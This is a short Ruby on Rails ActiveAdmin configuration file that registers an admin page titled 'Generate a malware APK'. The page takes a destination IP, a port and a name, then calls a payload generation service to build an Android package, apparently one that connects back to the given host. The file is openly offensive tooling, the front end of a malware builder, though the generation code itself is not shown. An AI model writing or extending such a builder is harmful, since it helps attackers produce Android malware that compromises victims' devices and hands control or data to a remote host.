ActiveAdmin.register ApkPayload do
  menu priority: 1, label: "⚙️ Generate APK", parent: "📦 APK"

  form title: "Generate a malware APK" do |f|
    inputs do
      f.input :destination_ip
      f.input :destination_port
      f.input :name
    end
    para "Make sure the IP is reachable and the port is open."
    actions
  end

  after_create do |apk_payload|
    service = PayloadGenerationService.new(apk_payload)
    if service.generate
      flash[:notice] = "APK Generated successfully: #{apk_payload.name}.apk"
    else
      flash[:error] = "Error generating APK. Check logs."
    end
  end

  permit_params :destination_ip, :destination_port, :forwarding_ip, :forwarding_port, :name
end
